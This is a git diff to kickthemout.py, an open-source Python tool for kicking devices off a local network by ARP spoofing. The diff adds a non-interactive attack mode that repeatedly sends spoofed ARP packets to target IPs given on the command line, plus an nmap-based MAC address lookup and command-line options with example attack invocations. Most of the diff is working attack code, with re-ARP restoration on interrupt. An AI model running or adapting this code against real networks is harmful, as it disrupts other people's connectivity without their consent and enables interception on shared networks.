@@ -8,10 +8,9 @@ Copyright (C) 2016 Nikolaos Kamarinakis (nikolaskam@gmail.com) & David Schütz (
 See License at nikolaskama.me (https://nikolaskama.me/kickthemoutproject)
 """
 
-import time, os, sys, logging, math
+import time, os, sys, logging, math, traceback, optparse
 from time import sleep
 import urllib2 as urllib
-import traceback
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
 notRoot = False
@@ -91,11 +90,6 @@ def runDebug():
     except:
         print ("Failed to print defaultGatewayIP...")
     try:
-        print ("Current hostslist array: ")
-        print hostsList
-    except:
-        print ("Failed to print hostsList array...")
-    try:
         print ("Crash trace: ")
         print(traceback.format_exc())
     except:
@@ -147,16 +141,85 @@ def scanNetwork():
 
 
 
+# TODO: Add this to scan.py
+# retrieve host MAC address
+def retrieveMACAddress(hosts):
+
+    import nmap
+
+    nm = nmap.PortScanner()
+    a = nm.scan(hosts=hosts, arguments='-sP -n')
+    
+    for k, v in a['scan'].iteritems():
+        if str(v['status']['state']) == 'up':
+            try:
+                return str(v['addresses']['mac'])
+            except:
+                pass
+
+
+
+# non interactive attack vector
+def nonInteractiveAttack():
+
+    print("\n{0}nonInteractiveAttack{1} activated...{2}").format(RED, GREEN, END) 
+
+    target = options.targets
+    print("\n{0}Targets: {1}" + ", ".join(target)).format(GREEN, END)
+
+    print("\n{0}Spoofing started... {1}").format(GREEN, END)
+
+    defaultGatewayIP = getGatewayIP()
+    defaultGatewayMac = retrieveMACAddress(defaultGatewayIP)
+
+    try:
+        while True:
+            # broadcast malicious ARP packets (10p/s)
+            for i in target:
+                ip_address = i
+                try:
+                    mac_address = retrieveMACAddress(ip_address)
+                except:
+                    print("\n{0}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{1}").format(RED, END)
+                    raise SystemExit
+
+                spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, ip_address, mac_address)
+            time.sleep(10)
+    except KeyboardInterrupt:
+        # re-arp targets on KeyboardInterrupt exception
+        print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
+        reArp = 1
+        while reArp != 10:
+            # broadcast ARP packets with legitimate info to restore connection
+            for i in target:
+                ip_address = i
+                try:
+                    mac_address = retrieveMACAddress(ip_address)
+                except:
+                    print("\n{0}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{1}").format(RED, END)
+                    raise SystemExit
+                try:
+                    spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, ip_address, mac_address)
+                except KeyboardInterrupt:
+                    pass
+                except:
+                    runDebug()
+            reArp += 1
+            time.sleep(0.5)
+        print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
+
+
+
 # kick one device
 def kickoneoff():
     os.system("clear||cls")
 
     print("\n{0}kickONEOff{1} selected...{2}\n").format(RED, GREEN, END)
+
     sys.stdout.write("{0}Hang on...{1}\r".format(GREEN, END))
     sys.stdout.flush()
     scanNetwork()
-
-
+    
     print("Online IPs: ")
     for i in range(len(onlineIPs)):
         mac = ""
@@ -165,7 +228,7 @@ def kickoneoff():
                 mac = host[1]
         vendor = resolveMac(mac)
         print("  [{0}" + str(i) + "{1}] {2}" + str(onlineIPs[i]) + "{3}\t"+ vendor + "{4}").format(YELLOW, WHITE, RED, GREEN, END)
-
+    
     canBreak = False
     while not canBreak:
         try:
@@ -403,7 +466,7 @@ def getDefaultInterfaceMAC():
 # resolve mac address of each vendor
 def resolveMac(mac):
     try:
-        # sen request to macvendors.co
+        # send request to macvendors.co
         url = "http://macvendors.co/api/vendorname/"
         request = urllib.Request(url + mac, headers={'User-Agent': "API Browser"})
         response = urllib.urlopen(request)
@@ -422,66 +485,116 @@ def main():
     # display heading
     heading()
 
-    print(
-        "\n{0}Using interface '{1}" + defaultInterface + "{2}' with mac address '{3}" + defaultInterfaceMac + "{4}'.\nGateway IP: '{5}"
-        + defaultGatewayIP + "{6}' --> {7}" + str(len(hostsList)) + "{8} hosts are up.{9}").format(GREEN, RED, GREEN, RED, GREEN, 
-                                                                                                RED, GREEN, RED, GREEN, END)
-    # display warning in case of no active hosts
-    if len(hostsList) == 0 or len(hostsList) == 1:
-        if len(hostsList) == 1:
-            if hostsList[0][0] == defaultGatewayIP:
-                print("\n{0}{1}WARNING: There are {2}0{3} hosts up on you network except your gateway.\n\tYou can't kick anyone off {4}:/{5}\n").format(
-                    GREEN, RED, GREEN, RED, GREEN, END)
-                raise SystemExit
-        else:
-            print(
-            "\n{0}{1}WARNING: There are {2}0{3} hosts up on you network.\n\tIt looks like something went wrong {4}:/{5}").format(
-                GREEN, RED, GREEN, RED, GREEN, END)
-            print(
-            "\n{0}If you are experiencing this error multiple times, please submit an issue here:\n\t{1}https://github.com/k4m4/kickthemout/issues\n{2}").format(
-                RED, BLUE, END)
-            raise SystemExit
+    if interactive:
 
-    try:
-
-        while True:
-
-            optionBanner()
-
-            header = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
-            choice = raw_input(header)
-
-            if choice.upper() == 'E' or choice.upper() == 'EXIT':
-                print('\n{0}Thanks for dropping by.'
-                      '\nCatch ya later!{1}').format(GREEN, END)
-                raise SystemExit
-            elif choice == '1':
-                kickoneoff()
-            elif choice == '2':
-                kicksomeoff()
-            elif choice == '3':
-                kickalloff()
-            elif choice.upper() == 'CLEAR':
-                os.system("clear||cls")
+        print(
+            "\n{0}Using interface '{1}" + defaultInterface + "{2}' with mac address '{3}" + defaultInterfaceMac + "{4}'.\nGateway IP: '{5}"
+            + defaultGatewayIP + "{6}' --> {7}" + str(len(hostsList)) + "{8} hosts are up.{9}").format(GREEN, RED, GREEN, RED, GREEN, RED, GREEN, RED, GREEN, END)
+        # display warning in case of no active hosts
+        if len(hostsList) == 0 or len(hostsList) == 1:
+            if len(hostsList) == 1:
+                if hostsList[0][0] == defaultGatewayIP:
+                    print("\n{0}{1}WARNING: There are {2}0{3} hosts up on you network except your gateway.\n\tYou can't kick anyone off {4}:/{5}\n").format(
+                        GREEN, RED, GREEN, RED, GREEN, END)
+                    raise SystemExit
             else:
-                print("\n{0}ERROR: Please select a valid option.{1}\n").format(RED, END)
+                print(
+                "\n{0}{1}WARNING: There are {2}0{3} hosts up on you network.\n\tIt looks like something went wrong {4}:/{5}").format(
+                    GREEN, RED, GREEN, RED, GREEN, END)
+                print(
+                "\n{0}If you are experiencing this error multiple times, please submit an issue here:\n\t{1}https://github.com/k4m4/kickthemout/issues\n{2}").format(
+                    RED, BLUE, END)
+                raise SystemExit
 
-    except KeyboardInterrupt:
-        print('\n\n{0}Thanks for dropping by.'
-              '\nCatch ya later!{1}').format(GREEN, END)
+    else:
+
+        print("\n{0}Using interface '{1}" + defaultInterface + "{2}' with mac address '{3}" + defaultInterfaceMac + "{4}'.\nGateway IP: '{5}" + 
+            defaultGatewayIP + "{6}' --> Target(s): '{7}" + ", ".join(options.targets) + "{8}'.{9}").format(GREEN, RED, GREEN, RED, GREEN, RED, GREEN, RED, GREEN, END)
+
+    if interactive:
+
+        try:
+    
+            while True:
+    
+                optionBanner()
+    
+                header = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
+                choice = raw_input(header)
+    
+                if choice.upper() == 'E' or choice.upper() == 'EXIT':
+                    print('\n{0}Thanks for dropping by.'
+                          '\nCatch ya later!{1}').format(GREEN, END)
+                    raise SystemExit
+                elif choice == '1':
+                    kickoneoff()
+                elif choice == '2':
+                    kicksomeoff()
+                elif choice == '3':
+                    kickalloff()
+                elif choice.upper() == 'CLEAR':
+                    os.system("clear||cls")
+                else:
+                    print("\n{0}ERROR: Please select a valid option.{1}\n").format(RED, END)
+
+        except KeyboardInterrupt:
+            print('\n\n{0}Thanks for dropping by.'
+                  '\nCatch ya later!{1}').format(GREEN, END)
+
+    else:
+
+        nonInteractiveAttack()
+
+
 
 if __name__ == '__main__':
 
+    # implement option parser
+    optparse.OptionParser.format_epilog = lambda self, formatter: self.epilog
+
+    version = '0.1'
+    info = 'KickThemOut ' + version + ' Nikolaos Kamarinakis (nikolaskama.me)'
+
+    examples = ('\nExamples:\n'+
+                '  sudo python kickthemout.py --attack arp --target 192.168.1.10 \n'+
+                '  sudo python kickthemout.py -a dns -t 192.168.1.5,192.168.1.10 \n'+
+                '  sudo python kickthemout.py')
+
+    parser = optparse.OptionParser(epilog=examples,
+        usage='sudo python %prog [options]',
+        prog='kickthemout.py', version=('KickThemOut ' + version))
+
+    parser.add_option('-a', '--attack', action='store',
+        dest='attack', help='attack method')
+
+    def targetList(option, opt, value, parser):
+        setattr(parser.values, option.dest, value.split(','))
+    parser.add_option('-t', '--target', action='callback',
+        callback=targetList, type='string',
+        dest='targets', help='specify target IP addresses')
+
+    (options, argv) = parser.parse_args()
+
     # configure appropriate network info
-    sys.stdout.write("{0}Scanning your network, hang on...{1}\r".format(GREEN, END))
-    sys.stdout.flush()
     defaultInterface = getDefaultInterface()
     defaultGatewayIP = getGatewayIP()
     defaultInterfaceMac = getDefaultInterfaceMAC()
     global defaultGatewayMacSet
     defaultGatewayMacSet = False
 
-    # commence scanning process
-    scanNetwork()
+    if options.attack is None and options.targets is None:
+
+        # set to interactive version
+        interactive = True
+        sys.stdout.write("{0}Scanning your network, hang on...{1}\r".format(GREEN, END))
+        sys.stdout.flush()
+        
+        # commence scanning process
+        scanNetwork()
+
+    else:
+
+        # set to optparser version
+        interactive = False
 
     main()
